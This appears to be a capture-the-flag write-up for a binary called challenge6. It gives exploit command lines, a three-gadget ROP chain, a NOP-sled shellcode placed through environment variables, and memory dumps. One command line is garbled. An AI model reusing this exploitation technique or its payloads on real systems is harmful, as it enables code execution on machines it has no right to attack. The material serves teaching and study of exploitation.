# Challenge6
step 1:
source ./env_nightmare.sh
step 2:
Debugging:
radare2 -d ./challenge6 65535 A264 `python -c 'print "\x0c"'`44 `python -c 'print "\x88"'`45 `python -c 'print "\x04"'`46 `python -c 'print "\x08"'`47 `python -c 'print "\xd0"'`64 `python -c 'print "\x86"'`65 `python -c 'print "\x04"'`66 `python -c 'print "\x08"'`67 `python -c 'print "\x04"'`66 `python -c 'print "\x57"'`68 `python -c 'print "\x88"'`69 `python -c 'print "\x04"'`70 `python -c 'print "\x08"'`71

Without Debugging:
./challenge6 65535 `python -c ~264 `python -c 'print "\x0c"'`44 `python -c 'print "\x88"'`45 `python -c 'print "\x04"'`46 `python -c 'print "\x08"'`47 `python -c 'print "\xd0"'`64 `python -c 'print "\x86"'`65 `python -c 'print "\x04"'`66 `python -c 'print "\x08"'`67 `python -c 'print "\x04"'`66 `python -c 'print "\x57"'`68 `python -c 'print "\x88"'`69 `python -c 'print "\x04"'`70 `python -c 'print "\x08"'`71

Notes:

To exploit this application you have to create a shit ton of environment variables using env_nightmare.sh.
Once that is done the above command labeled "Without Debugging" uses a rop chain to successfully exploit
the target application. Bellow are the rop chains that are used in the order they are presented as command
line arguments:

first rop gadget:
0x0804880c      5b             pop ebx                                                       
0x0804880d      5e             pop esi                                                       
0x0804880e      5f             pop edi                                                       
0x0804880f      5d             pop ebp                                                       
0x08048810      c3             ret

this gadget clears the next 4 DWORDs from the stack since these dwords are touchy and used as counters and such.

second rop gadget:
0x080486d0      c2b800         ret 0xb8

This gadget is used to position us into the list of pointers to environment variables that are available to the 
vulnerable application. It essentially is esp + 184 bytes so we can clear unwanted data from stack and position
us in the list of environment variable pointers.

third rop gadget:
0x08048857      5b             pop ebx                                                       
0x08048858      5d             pop ebp                                                       
0x08048859      c3             ret

This is a standard rop gadget that clears two environment variables that are not our buffer from the stack. This
gadget does the final positioning to our environment variable that stores our shellcode.

Why debugging and without debugging?

The reason why there are two different variations of the exploit above is due to a weirdness in running the exploit
using the radare2 debugger and running the vulnerable app without the debugger. It seems that for some reason the 
list of environment variable changes when you are running in a debugger. Thats why the only thing that changes is
the first argument A232. To understand what this argument is used for you have to understand how environment variables
are stored on the stack. As mentioned above a series of pointers to each environment variable is stored on the stack like
shown below.

0xff7dfedc  0x000000100804880c  0xff7dffb8ff7dff74   ........t.}...}.
0xff7dfeec  0x080486d0ff7dff04  0xf7f2300008048857   ..}.....W....0..
0xff7dfefc  0xf7f85000f7f6e7ea  0xf7f2300000000000   .....P.......0..
0xff7dff0c  0x0000000000000000  0x9d03d47bcb909e6a   ........j...{...
0xff7dff1c  0x0000000000000000  0x0000001000000000   ................
0xff7dff2c  0x00000000080484a0  0xf7f6ecb0f7f742e0   .........B......
0xff7dff3c  0x00000010f7f85000  0x00000000080484a0   .P..............
0xff7dff4c  0x080485e2080484c1  0xff7dff7400000010   ............t.}.
0xff7dff5c  0x08048820080487b0  0xff7dff6cf7f6ecb0   .... .......l.}.
0xff7dff6c  0x00000010f7f85920  0xff7e25ebff7e25de    Y.......%~..%~.
0xff7dff7c  0xff7e25f6ff7e25f1  0xff7e25feff7e25fa   .%~..%~..%~..%~.
0xff7dff8c  0xff7e2606ff7e2602  0xff7e260eff7e260a   .&~..&~..&~..&~.
0xff7dff9c  0xff7e2616ff7e2612  0xff7e261eff7e261a   .&~..&~..&~..&~.
0xff7dffac  0xff7e2626ff7e2622  0xff7e264100000000   "&~.&&~.....A&~.
0xff7dffbc  0xff7e27aaff7e26ea  0xff7e292aff7e286a   .&~..'~.j(~.*)~.

if we choose say the one stored at 0xff7dffbc which is the environment variable stored at 0xff7e26ea then we see this:

[0x080487a9]> x/x 0xff7e26ea
0xff7e26ea  0x383935726176796d                       myvar598

So it is pointing to one of the environment variables we control called myvar598. The problem is we need that pointer to
instead of pointing to the environment variable name to instead point to our shellcode with our nopsled.so we need some 
way of modifying the pointer 0xff7e26ea to point somewhere into our buffer instead of at the name of the environment
variable. To do this all we need to do is modify the least significant byte 0xea. We can do this because we have write anywhere
access to the stack via our exploit. This is where the A232 (first argument) comes in. What we do now is since we know which
environment variable we want to modify to point to our shellcode all we do is overwrite the least significant byte with an
A (0x41). Then we end up getting 0xff7e2641 which if we look:

[0x080487a9]> x/x 0xff7e2641
0xff7e2641  0x9090909090909090                       ........

it gets us into the nopsled portion of our shellcode an bingo bobs your uncle tom! Now coming back to why we have two
different first arguments for when we run the app in the debugger and when we run the app without one it comes down to
a different number and ordering of our environment variables on the stack. It just so happens that is we run the exploit
with A232 we end up with a segmentation fault that looks like this in GDB:

Core was generated by `./challenge6 65535 A264 
                                               44 �45 4647 �64 �65 6667 66 W68 �69 7071'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xffcc1641 in ?? ()

Notice it crashed when trying to execute 0xffcc1641 which if you were paying attention is actutally the pointer to our
environment variable we are trying to execute with the ret from our 3rd rop gadget (hint: 0x41 as least significant byte).
lets see what gdb shows us of the core dump at that address:

(gdb) x/30x 0xffcc1641
0xffcc1641:	0x36880038	0x37040039	0x37080030	0x796d0031
0xffcc1651:	0x35726176	0x903d3939	0x90909090	0x90909090
0xffcc1661:	0x90909090	0x90909090	0x90909090	0x90909090
0xffcc1671:	0x90909090	0x90909090	0x90909090	0x90909090
0xffcc1681:	0x90909090	0x90909090	0x90909090	0x90909090
0xffcc1691:	0x90909090	0x90909090	0x90909090	0x90909090
0xffcc16a1:	0x90909090	0x90909090	0x90909090	0x90909090
0xffcc16b1:	0x90909090	0x90909090

Hmmm well thats interesting, we should be executing our nopsled but instead we are trying to execute 0x36880038 which is part
of some other environment variable. How do we fix this you might think? Well we could just change the A (0x41) part of the pointer
to something bigger so we end up further down the buffer where the environment variables are stored. All we have to do is consult
an ascii hex chart and choose the larger character value like in my case ~ (0x7E) which will almost guarantee that we will end up
in our nopsled every time like we can see below.

(gdb) x/30x 0xffcc167E
0xffcc167e:	0x90909090	0x90909090	0x90909090	0x90909090
0xffcc168e:	0x90909090	0x90909090	0x90909090	0x90909090
0xffcc169e:	0x90909090	0x90909090	0x90909090	0x90909090
0xffcc16ae:	0x90909090	0x90909090	0x90909090	0xefbb9090
0xffcc16be:	0xda41e029	0x2474d9cc	0xc9335af4	0xc2830eb1
0xffcc16ce:	0x115a3104	0xe2115a03	0x19eb431a	0xf18dc67d
0xffcc16de:	0xe5d88450	0x81a865c2	0x30611212	0x57f48c7b
0xffcc16ee:	0x9813b829	0xed3338cd

After changing the first argument now we can say for certain that our exploit will work without having access to a debugger on the system.

***Important Note***

Testing this exploit on a completely different system showed signs that even modifying the least significant byte does not always lead to
exploitation. So I recommend modifying the second least significant byte like the one shown below:

./challenge6 65535 `python -c 'print "\xff"'`265 `python -c 'print "\x0c"'`44 `python -c 'print "\x88"'`45 `python -c 'print "\x04"'`46 `python -c 'print "\x08"'`47 `python -c 'print "\xd0"'`64 `python -c 'print "\x86"'`65 `python -c 'print "\x04"'`66 `python -c 'print "\x08"'`67 `python -c 'print "\x04"'`66 `python -c 'print "\x57"'`68 `python -c 'print "\x88"'`69 `python -c 'print "\x04"'`70 `python -c 'print "\x08"'`71

this command worked on both systems I tested the exploit on about 3/4's of the time. If you get segmentation fault once or twice keep trying
it will eventually work. If not play around with the value being written and try changing from least significant byte to second least
significant byte.
